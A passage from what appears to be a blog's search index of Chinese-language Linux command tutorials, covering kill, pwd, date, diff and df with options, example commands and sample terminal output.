test6]# 实例5：杀死指定用户所有进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12kill -9 $(ps -ef | grep peidalinux)kill -u peidalinux &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost ~]# kill -9 $(ps -ef | grep peidalinux) [root@localhost ~]# kill -u peidalinux &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;方法一，过滤出hnlinux用户进程并杀死 实例6：init进程是不可杀的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1kill -9 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# ps -ef|grep initroot 1 0 0 Nov02 ? 00:00:00 init [3] root 17563 17534 0 17:37 pts/1 00:00:00 grep init[root@localhost ~]# kill -9 1[root@localhost ~]# kill -HUP 1[root@localhost ~]# ps -ef|grep initroot 1 0 0 Nov02 ? 00:00:00 init [3] root 17565 17534 0 17:38 pts/1 00:00:00 grep init[root@localhost ~]# kill -KILL 1[root@localhost ~]# ps -ef|grep initroot 1 0 0 Nov02 ? 00:00:00 init [3] root 17567 17534 0 17:38 pts/1 00:00:00 grep init[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;init是Linux系统操作中不可缺少的程序之一。所谓的init进程，它是一个由内核启动的用户级进程。内核自行启动（已经被载入内存，开始运行，并已初始化所有的设备驱动程序和数据结构等）之后，就通过启动一个用户级程序init的方式，完成引导进程。所以,init始终是第一个进程（其进程编号始终为1）。 其它所有进程都是init进程的子孙。init进程是不可杀的！]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- pwd]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F4.%20Linux%20%E5%91%BD%E4%BB%A4-pwd%2F</url>
    <content type="text"><![CDATA[Linux 命令- pwd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux中用 pwd 命令来查看”当前工作目录“的完整路径。 简单得说，每当你在终端进行操作时，你都会有一个当前工作目录。 在不太确定当前位置时，就会使用pwd来判定当前目录在文件系统内的确切位置。 1．命令格式：1pwd [选项] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看”当前工作目录“的完整路径 3．常用参数： 一般情况下不带任何参数 如果目录是链接时：格式：pwd -P 显示出实际路径，而非使用连接（link）路径。 4．常用实例：实例1：用 pwd 命令查看默认工作目录的完整路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1pwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123[root@localhost ~]# pwd/root[root@localhost ~]# 实例2：使用 pwd 命令查看指定文件夹&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1pwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234[root@localhost ~]# cd /opt/soft/[root@localhost soft]# pwd /opt/soft[root@localhost soft]# 实例3：目录连接链接时，pwd -P 显示出实际路径，而非使用连接（link）路径；pwd显示的是连接路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1pwd -P &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost soft]# cd /etc/init.d [root@localhost init.d]# pwd/etc/init.d[root@localhost init.d]# pwd -P/etc/rc.d/init.d[root@localhost init.d]# 实例4：/bin/pwd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1/bin/pwd [选项] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选项： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-L 目录连接链接时，输出连接路径 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-P 输出物理路径 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost init.d]# /bin/pwd /etc/rc.d/init.d[root@localhost init.d]# /bin/pwd --help[root@localhost init.d]# /bin/pwd -P/etc/rc.d/init.d[root@localhost init.d]# /bin/pwd -L/etc/init.d[root@localhost init.d]# 实例5：当前目录被删除了，而pwd命令仍然显示那个目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314[root@localhost init.d]# cd /opt/soft[root@localhost soft]# mkdir removed[root@localhost soft]# cd removed/[root@localhost removed]# pwd/opt/soft/removed[root@localhost removed]# rm ../removed -rf[root@localhost removed]# pwd/opt/soft/removed[root@localhost removed]# /bin/pwd/bin/pwd: couldn't find directory entry in “..” with matching i-node[root@localhost removed]# cd [root@localhost ~]# pwd/root[root@localhost ~]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- date]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F39.%20Linux%20%E5%91%BD%E4%BB%A4-%20date%2F</url>
    <content type="text"><![CDATA[Linux 命令- date&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux环境中，不管是编程还是其他维护，时间是必不可少的，也经常会用到时间的运算，熟练运用date命令来表示自己想要表示的时间，肯定可以给自己的工作带来诸多方便。 1．命令格式1date [参数]... [+格式] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;date 可以用来显示或设定系统的日期与时间。 3．命令参数：必要参数: %H 小时(以00-23来表示)。 %I 小时(以01-12来表示)。 %K 小时(以0-23来表示)。 %l 小时(以0-12来表示)。 %M 分钟(以00-59来表示)。 %P AM或PM。 %r 时间(含时分秒，小时以12小时AM/PM来表示)。 %s 总秒数。起算时间为1970-01-01 00:00:00 UTC。 %S 秒(以本地的惯用法来表示)。 %T 时间(含时分秒，小时以24小时制来表示)。 %X 时间(以本地的惯用法来表示)。 %Z 市区。 %a 星期的缩写。 %A 星期的完整名称。 %b 月份英文名的缩写。 %B 月份的完整英文名称。 %c 日期与时间。只输入date指令也会显示同样的结果。 %d 日期(以01-31来表示)。 %D 日期(含年月日)。 %j 该年中的第几天。 %m 月份(以01-12来表示)。 %U 该年中的周数。 %w 该周的天数，0代表周日，1代表周一，异词类推。 %x 日期(以本地的惯用法来表示)。 %y 年份(以00-99来表示)。 %Y 年份(以四位数来表示)。 %n 在显示时，插入新的一行。 %t 在显示时，插入tab。 MM 月份(必要) DD 日期(必要) hh 小时(必要) mm 分钟(必要) ss 秒(选择性) 选择参数: -d&lt;字符串&gt; 显示字符串所指的日期与时间。字符串前后必须加上双引号。 -s&lt;字符串&gt; 根据字符串来设置日期与时间。字符串前后必须加上双引号。 -u 显示GMT。 –help 在线帮助。 –version 显示版本信息 4．使用说明1.在显示方面，使用者可以设定欲显示的格式，格式设定为一个加号后接数个标记，其中可用的标记列表如下: % : 打印出 %： %n : 下一行 %t : 跳格 %H : 小时(00..23) %I : 小时(01..12) %k : 小时(0..23) %l : 小时(1..12) %M : 分钟(00..59) %p : 显示本地 AM 或 PM %r : 直接显示时间 (12 小时制，格式为 hh:mm:ss [AP]M) %s : 从 1970 年 1 月 1 日 00:00:00 UTC 到目前为止的秒数 %S : 秒(00..61) %T : 直接显示时间 (24 小时制) %X : 相当于 %H:%M:%S %Z : 显示时区 %a : 星期几 (Sun..Sat) %A : 星期几 (Sunday..Saturday) %b : 月份 (Jan..Dec) %B : 月份 (January..December) ;%c : 直接显示日期与时间 %d : 日 (01..31) %D : 直接显示日期 (mm/dd/yy) %h : 同 %b %j : 一年中的第几天 (001..366) %m : 月份 (01..12) %U : 一年中的第几周 (00..53) (以 Sunday 为一周的第一天的情形) %w : 一周中的第几天 (0..6) %W : 一年中的第几周 (00..53) (以 Monday 为一周的第一天的情形) %x : 直接显示日期 (mm/dd/yy) %y : 年份的最后两位数字 (00.99) %Y : 完整年份 (0000..9999) 2.在设定时间方面： date -s //设置当前时间，只有root权限才能设置，其他只能查看。 date -s 20080523 //设置成20080523，这样会把具体时间设置成空00:00:00 date -s 01:01:01 //设置具体时间，不会对日期做更改 date -s “01:01:01 2008-05-23″ //这样可以设置全部时间 date -s “01:01:01 20080523″ //这样可以设置全部时间 date -s “2008-05-23 01:01:01″ //这样可以设置全部时间 date -s “20080523 01:01:01″ //这样可以设置全部时间 3.加减： date +%Y%m%d //显示前天年月日 date +%Y%m%d –date=”+1 day” //显示前一天的日期 date +%Y%m%d –date=”-1 day” //显示后一天的日期 date +%Y%m%d –date=”-1 month” //显示上一月的日期 date +%Y%m%d –date=”+1 month” //显示下一月的日期 ;date +%Y%m%d –date=”-1 year” //显示前一年的日期 date +%Y%m%d –date=”+1 year” //显示下一年的日期 5．使用实例实例1：显示当前时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456datedate '+%c'date '+%D'date '+%x'date '+%T'date '+%X' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011[root@localhost ~]# date2012年 12月 08日 星期六 08:31:35 CST[root@localhost ~]# date '+%c'2012年12月08日 星期六 08时34分44秒[root@localhost ~]# date '+%D'12/08/12[root@localhost ~]# date '+%x'2012年12月08日[root@localhost ~]# date '+%T'08:35:36[root@localhost ~]# date '+%X'08时35分54秒[root@localhost ~]# 实例2：显示日期和设定时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1date --date 08:42:00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# date '+%c'2012年12月08日 星期六 08时41分37秒[root@localhost ~]# date --date 08:42:002012年 12月 08日 星期六 08:42:00 CST[root@localhost ~]# date '+%c' --date 08:45:002012年12月08日 星期六 08时45分00秒[root@localhost ~]# 实例3：date -d参数使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost ~]# date -d "nov 22"2012年 11月 22日 星期四 00:00:00 CST[root@localhost ~]# date -d '2 weeks'2012年 12月 22日 星期六 08:50:21 CST[root@localhost ~]# date -d 'next monday'2012年 12月 10日 星期一 00:00:00 CST[root@localhost ~]# date -d next-day +%Y%m%d20121209[root@localhost ~]# date -d tomorrow +%Y%m%d20121209[root@localhost ~]# date -d last-day +%Y%m%d20121207[root@localhost ~]# date -d yesterday +%Y%m%d20121207[root@localhost ~]# date -d last-month +%Y%m201211[root@localhost ~]# date -d next-month +%Y%m201301[root@localhost ~]# date -d '30 days ago' 2012年 11月 08日 星期四 08:51:37 CST[root@localhost ~]# date -d '-100 days' 2012年 08月 30日 星期四 08:52:03 CST[root@localhost ~]# date -d 'dec 14 -2 weeks'2012年 11月 30日 星期五 00:00:00 CST[root@localhost ~]# date -d '50 days'2013年 01月 27日 星期日 08:52:27 CST &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;date 命令的另一个扩展是 -d 选项，该选项非常有用。使用这个功能强大的选项，通过将日期作为引号括起来的参数提供，您可以快速地查明一个特定的日期。-d 选项还可以告诉您，相对于当前日期若干天的究竟是哪一天，从现在开始的若干天或若干星期以后，或者以前（过去）。通过将这个相对偏移使用引号括起来，作为 -d 选项的参数，就可以完成这项任务。 具体说明如下： date -d “nov 22” 今年的 11 月 22 日是星期三 date -d ‘2 weeks’ 2周后的日期 date -d ‘next monday’ (下周一的日期) date -d next-day +%Y%m%d（明天的日期）或者：date -d tomorrow +%Y%m%d date -d last-day +%Y%m%d(昨天的日期) 或者：date -d yesterday +%Y%m%d date -d last-month +%Y%m(上个月是几月) date -d next-month +%Y%m(下个月是几月) 使用 ago 指令，您可以得到过去的日期： date -d ‘30 days ago’ （30天前的日期） 使用负数以得到相反的日期： date -d ‘dec 14 -2 weeks’ （相对:dec 14这个日期的两周前的日期） date -d ‘-100 days’ (100天以前的日期) date -d ‘50 days’(50天后的日期) 实例4：显示月份和日数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1date '+%B %d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost ~]# date '+%B %d' 十二月 08[root@localhost ~]# 实例5：显示时间后跳行，再显示目前日期&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1date '+%T%n%D' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# date '+%T%n%D'09:00:3012/08/12[root@localhost ~]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- diff]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F38.%20Linux%20%E5%91%BD%E4%BB%A4-%20diff%2F</url>
    <content type="text"><![CDATA[Linux 命令- diff&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;diff 命令是 linux上非常重要的工具，用于比较文件的内容，特别是比较两个版本不同的文件以找到改动的地方。diff在命令行中打印每一个行的改动。最新版本的diff还支持二进制文件。diff程序的输出被称为补丁 (patch)，因为Linux系统中还有一个patch程序，可以根据diff的输出将a.c的文件内容更新为b.c。diff是svn、cvs、git等版本控制工具不可或缺的一部分。 1．命令格式1diff [参数] [文件1或目录1] [文件2或目录2] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;diff命令能比较单个文件或者目录内容。如果指定比较的是文件，则只有当输入为文本文件时才有效。以逐行的方式，比较文本文件的异同处。如果指定比较的是目录的的时候，diff 命令会比较两个目录下名字相同的文本文件。列出不同的二进制文件、公共子目录和只在一个目录出现的文件。 3．命令参数： 指定要显示多少行的文本。此参数必须与-c或-u参数一并使用。 -a或–text diff预设只会逐行比较文本文件。 -b或–ignore-space-change 不检查空格字符的不同。 -B或–ignore-blank-lines 不检查空白行。 -c 显示全部内文，并标出不同之处。 -C或–context 与执行”-c-“指令相同。 -d或–minimal 使用不同的演算法，以较小的单位来做比较。 -D或ifdef 此参数的输出格式可用于前置处理器巨集。 -e或–ed 此参数的输出格式可用于ed的script文件。 -f或-forward-ed 输出的格式类似ed的script文件，但按照原来文件的顺序来显示不同处。 -H或–speed-large-files 比较大文件时，可加快速度。 -l或–ignore-matching-lines 若两个文件在某几行有所不同，而这几行同时都包含了选项中指定的字符或字符串，则不显示这两个文件的差异。 -i或–ignore-case 不检查大小写的不同。 -l或–paginate 将结果交由pr程序来分页。 -n或–rcs 将比较结果以RCS的格式来显示。 -N或–new-file 在比较目录时，若文件A仅出现在某个目录中，预设会显示：Only in目录：文件A若使用-N参数，则diff会将文件A与一个空白的文件比较。 -p 若比较的文件为C语言的程序码文件时，显示差异所在的函数名称。 -P或–unidirectional-new-file 与-N类似，但只有当第二个目录包含了一个第一个目录所没有的文件时，才会将这个文件与空白的文件做比较。 -q或–brief 仅显示有无差异，不显示详细的信息。 -r或–recursive 比较子目录中的文件。 -s或–report-identical-files 若没有发现任何差异，仍然显示信息。 -S或–starting-file 在比较目录时，从指定的文件开始比较。 -t或–expand-tabs 在输出时，将tab字符展开。 -T或–initial-tab 在每行前面加上tab字符以便对齐。 -u,-U或–unified= 以合并的方式来显示文件内容的不同。 -v或–version 显示版本信息。 -w或–ignore-all-space 忽略全部的空格字符。 -W或–width 在使用-y参数时，指定栏宽。 -x或–exclude 不比较选项中所指定的文件或目录。 -X或–exclude-from 您可以将文件或目录类型存成文本文件，然后在=中指定此文本文件。 -y或–side-by-side 以并列的方式显示文件的异同之处。 –help 显示帮助。 –left-column 在使用-y参数时，若两个文件某一行内容相同，则仅在左侧的栏位显示该行内容。 –suppress-common-lines 在使用-y参数时，仅显示不同之处。 4．使用实例：实例1：比较两个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff log2014.log log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@localhost test3]# diff log2014.log log2013.log 3c3&lt; 2014-03---&gt; 2013-038c8&lt; 2013-07---&gt; 2013-0811,12d10&lt; 2013-11&lt; 2013-12 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的“3c3”和“8c8”表示log2014.log和log20143log文件在3行和第8行内容有所不同；”11,12d10”表示第一个文件比第二个文件多了第11和12行。 diff 的normal 显示格式有三种提示:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;a - add &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;c - change &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;d - delete 实例2：并排格式输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff log2013.log log2014.log -y -W 50 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test3]# diff log2014.log log2013.log -y -W 502013-01 2013-012013-02 2013-022014-03 | 2013-032013-04 2013-042013-05 2013-052013-06 2013-062013-07 2013-072013-07 | 2013-082013-09 2013-092013-10 2013-102013-11 &lt;2013-12 &lt;[root@localhost test3]# diff log2013.log log2014.log -y -W 502013-01 2013-012013-02 2013-022013-03 | 2014-032013-04 2013-042013-05 2013-052013-06 2013-062013-07 2013-072013-08 | 2013-072013-09 2013-092013-10 2013-10 &gt; 2013-11 &gt; 2013-12 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“|”表示前后2个文件内容有不同 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“&lt;”表示后面文件比前面文件少了1行内容 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“&gt;”表示后面文件比前面文件多了1行内容 实例3：上下文输出格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff log2013.log log2014.log -c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455[root@localhost test3]# diff log2013.log log2014.log -c*** log2013.log 2012-12-07 16:36:26.000000000 +0800--- log2014.log 2012-12-07 18:01:54.000000000 +0800****************** 1,10 **** 2013-01 2013-02! 2013-03 2013-04 2013-05 2013-06 2013-07! 2013-08 2013-09 2013-10--- 1,12 ---- 2013-01 2013-02! 2014-03 2013-04 2013-05 2013-06 2013-07! 2013-07 2013-09 2013-10+ 2013-11+ 2013-12[root@localhost test3]# diff log2014.log log2013.log -c*** log2014.log 2012-12-07 18:01:54.000000000 +0800--- log2013.log 2012-12-07 16:36:26.000000000 +0800****************** 1,12 **** 2013-01 2013-02! 2014-03 2013-04 2013-05 2013-06 2013-07! 2013-07 2013-09 2013-10- 2013-11- 2013-12--- 1,10 ---- 2013-01 2013-02! 2013-03 2013-04 2013-05 2013-06 2013-07! 2013-08 2013-09 2013-10[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种方式在开头两行作了比较文件的说明，这里有三中特殊字符： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“＋” 比较的文件的后者比前着多一行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“－” 比较的文件的后者比前着少一行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“！” 比较的文件两者有差别的行 实例4：统一格式输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff log2014.log log2013.log -u &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost test3]# diff log2014.log log2013.log -u--- log2014.log 2012-12-07 18:01:54.000000000 +0800+++ log2013.log 2012-12-07 16:36:26.000000000 +0800@@ -1,12 +1,10 @@ 2013-01 2013-02-2014-03+2013-03 2013-04 2013-05 2013-06 2013-07-2013-07+2013-08 2013-09 2013-10-2013-11-2013-12 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它的第一部分，也是文件的基本信息： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;— log2014.log 2012-12-07 18:01:54.000000000 +0800 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;+++ log2013.log 2012-12-07 16:36:26.000000000 +0800 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;”—“表示变动前的文件，”+++”表示变动后的文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二部分，变动的位置用两个@作为起首和结束。 @@ -1,12 +1,10 @@ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前面的”-1,12”分成三个部分：减号表示第一个文件（即log2014.log），”1”表示第1行，”12”表示连续12行。合在一起，就表示下面是第一个文件从第1行开始的连续12行。同样的，”+1,10”表示变动后，成为第二个文件从第1行开始的连续10行。 实例5：比较文件夹不同&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff test3 test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637[root@localhost test]# diff test3 test6Only in test6: linklog.logOnly in test6: log2012.logdiff test3/log2013.log test6/log2013.log1,10c1,3&lt; 2013-01&lt; 2013-02&lt; 2013-03&lt; 2013-04&lt; 2013-05&lt; 2013-06&lt; 2013-07&lt; 2013-08&lt; 2013-09&lt; 2013-10---&gt; hostnamebaidu=baidu.com&gt; hostnamesina=sina.com&gt; hostnames=truediff test3/log2014.log test6/log2014.log1,12d0&lt; 2013-01&lt; 2013-02&lt; 2014-03&lt; 2013-04&lt; 2013-05&lt; 2013-06&lt; 2013-07&lt; 2013-07&lt; 2013-09&lt; 2013-10&lt; 2013-11&lt; 2013-12Only in test6: log2015.logOnly in test6: log2016.logOnly in test6: log2017.log[root@localhost test]# 实例6：比较两个文件不同，并生产补丁&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff -ruN log2013.log log2014.log &gt;patch.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test3]# diff -ruN log2013.log log2014.log &gt;patch.log[root@localhost test3]# ll总计 12-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log-rw-r--r-- 1 root root 96 12-07 18:01 log2014.log-rw-r--r-- 1 root root 248 12-07 21:33 patch.log[root@localhost test3]# cat patc.logcat: patc.log: 没有那个文件或目录[root@localhost test3]# cat patch.log --- log2013.log 2012-12-07 16:36:26.000000000 +0800+++ log2014.log 2012-12-07 18:01:54.000000000 +0800@@ -1,10 +1,12 @@ 2013-01 2013-02-2013-03+2014-03 2013-04 2013-05 2013-06 2013-07-2013-08+2013-07 2013-09 2013-10+2013-11+2013-12[root@localhost test3]# 实例7：打补丁&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test3]# cat log2013.log2013-012013-022013-032013-042013-052013-062013-072013-082013-092013-10[root@localhost test3]# patch log2013.log patch.log patching file log2013.log[root@localhost test3]# [root@localhost test3]# cat log2013.log 2013-012013-022014-032013-042013-052013-062013-072013-072013-092013-102013-112013-12[root@localhost test3]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- df]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F35.%20Linux%20%E5%91%BD%E4%BB%A4-%20df%2F</url>
    <content type="text"><![CDATA[Linux 命令- df&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux中df命令的功能是用来检查linux服务器的文件系统的磁盘空间占用情况。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示指定磁盘文件的可用空间。如果没有文件名被指定，则所有当前被挂载的文件系统的可用空间将被显示。默认情况下，磁盘空间将以 1KB 为单位进行显示，除非环境变量 POSIXL_CORRECT 被指定，那样将以512字节为单位进行显示。 3.命令参数必要参数 -a 全部文件系统列表 -h 方便阅读方式显示 -H 等于“-h”，但是计算式，1K=1000，而不是1K=1024 -i 显示inode信息 -k 区块为1024字节 -l 只显示本地文件系统 -m 区块为1048576字节 –no-sync 忽略 sync 命令 -P 输出格式为POSIX –sync 在取得磁盘信息前，先执行sync命令 -T 文件系统类型 选择参数： –block-size=&lt;区块大小&gt; 指定区块大小 -t&lt;文件系统类型&gt; 只显示选定文件系统的磁盘信息 -x&lt;文件系统类型&gt; 不显示选定文件系统的磁盘信息 –help 显示帮助信息 –version 显示版本信息 4.使用实例实例1：显示磁盘使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@CT1190 log]# df文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda7 19840892 890896 17925856 5% //dev/sda9 203727156 112797500 80413912 59% /opt/dev/sda8 4956284 570080 4130372 13% /var/dev/sda6 19840892 1977568 16839184 11% /usr/dev/sda3 988116 23880 913232 3% /boottmpfs 16473212 0 16473212 0% /dev/shm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 中 df 命令的输出清单的第1列是代表文件系统对应设备文件的路径名（一般是硬盘上的分区）；第2列给出分区包含的数据块（1024字节）的数目；第3、4列分别表示已用的和可用的数据块数目。用户也许会感到奇怪的是，第3、4列块数之和不等于第2列中的块数。这是因为缺省的每个分区都留了少量空间供系统管理员使用。即使遇到普通用户空间已满的情况，管理员仍能登录和留有解决问题所需的工作空间。清单 use% 列表普通用户空间使用的百分比，即使这一数字达到 100% ，分区仍然留有系统管理员使用的空间。最后，Mounted on 列表示文件系统的挂载点。 实例2：以 inode 模式来显示磁盘使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -i &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@CT1190 log]# df -i文件系统 Inode (I)已用 (I)可用 (I)已用% 挂载点/dev/sda7 5124480 5560 5118920 1% //dev/sda9 52592640 50519 52542121 1% /opt/dev/sda8 1280000 8799 1271201 1% /var/dev/sda6 5124480 80163 5044317 2% /usr/dev/sda3 255232 34 255198 1% /boottmpfs 4118303 1 4118302 1% /dev/shm 实例3：显示指定类型磁盘&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -t ext3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@CT1190 log]# df -t ext3文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda7 19840892 890896 17925856 5% //dev/sda9 203727156 93089700 100121712 49% /opt/dev/sda8 4956284 570104 4130348 13% /var/dev/sda6 19840892 1977568 16839184 11% /usr/dev/sda3 988116 23880 913232 3% /boot 实例4：列出各文件系统的 i 节点使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -ia &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@CT1190 log]# df -ia文件系统 Inode (I)已用 (I)可用 (I)已用% 挂载点/dev/sda7 5124480 5560 5118920 1% /proc 0 0 0 - /procsysfs 0 0 0 - /sysdevpts 0 0 0 - /dev/pts/dev/sda9 52592640 50519 52542121 1% /opt/dev/sda8 1280000 8799 1271201 1% /var/dev/sda6 5124480 80163 5044317 2% /usr/dev/sda3 255232 34 255198 1% /boottmpfs 4118303 1 4118302 1% /dev/shmnone 0 0 0 - /proc/sys/fs/binfmt_misc 实例5：列出文件系统的类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -T &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678root@CT1190 log]# df -T文件系统 类型 1K-块 已用 可用 已用% 挂载点/dev/sda7 ext3 19840892 890896 17925856 5% //dev/sda9 ext3 203727156 93175692 100035720 49% /opt/dev/sda8 ext3 4956284 570104 4130348 13% /var/dev/sda6 ext3 19840892 1977568 16839184 11% /usr/dev/sda3 ext3 988116 23880 913232 3% /boottmpfs tmpfs 16473212 0 16473212 0% /dev/shm 实例6：以更易读的方式显示目前磁盘空间和使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -h &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132[root@CT1190 log]# df -h文件系统 容量 已用 可用 已用% 挂载点/dev/sda7 19G 871M 18G 5% //dev/sda9 195G 89G 96G 49% /opt/dev/sda8 4.8G 557M 4.0G 13% /var/dev/sda6 19G 1.9G 17G 11% /usr/dev/sda3 965M 24M 892M 3% /boottmpfs 16G 0 16G 0% /dev/shm[root@CT1190 log]# df -H文件系统 容量 已用 可用 已用% 挂载点/dev/sda7 21G 913M 19G 5% //dev/sda9 209G 96G 103G 49% /opt/dev/sda8 5.1G 584M 4.3G 13% /var/dev/sda6 21G 2.1G 18G 11% /usr/dev/sda3 1.1G 25M 936M 3% /boottmpfs 17G 0 17G 0% /dev/shm[root@CT1190 log]# df -lh文件系统 容量 已用 可用 已用% 挂载点/dev/sda7 19G 871M 18G 5% //dev/sda9 195G 89G 96G 49% /opt/dev/sda8 4.8G 557M 4.0G 13% /var/dev/sda6 19G 1.9G 17G 11% /usr/dev/sda3 965M 24M 892M 3% /boottmpfs 16G 0 16G 0% /dev/shm[root@CT1190 log]# df -k文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda7 19840892 890896 17925856 5% //dev/sda9 203727156 93292572 99918840 49% /opt/dev/sda8 4956284 570188 4130264 